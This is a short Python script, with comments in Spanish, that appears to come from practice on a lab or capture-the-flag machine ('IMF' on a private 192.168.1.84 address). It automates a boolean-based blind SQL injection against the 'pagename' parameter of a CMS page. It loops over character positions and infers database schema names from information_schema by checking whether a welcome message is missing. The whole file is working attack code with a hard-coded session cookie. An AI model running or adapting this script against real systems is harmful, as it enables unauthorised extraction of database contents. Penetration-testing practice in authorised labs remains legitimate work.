#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string



def def_handler(sig, frame):
    print("\n\n[!]Saliendo.....\n")
    sys.exit(1)



# Ctrl+c
signal.signal(signal.SIGINT,def_handler)

#Variables globales
characters = string.ascii_lowercase + "&_-:," + string.digits

main_url = "http://192.168.1.84/imfadministrator/cms.php?pagename="


def sqli():
    headers = {
            'Cookie' : 'PHPSESSID=sjd4mr67gqsacmfn578bfg7n91'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:

            sqli_url = main_url + "home' or substring(select group_concat(schema_name) from information_schema.schemata),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=headers)
                #Si esto no esta en el texto es que esta correcto
            if " Welcome to the IMF Administration." not in r.text:
                data += character
                p2.status(data)
                break
                
    p1.success("Ataque de inyeccion SQL finalizado exitosamente")
if __name__ == '__main__':

    sqli()
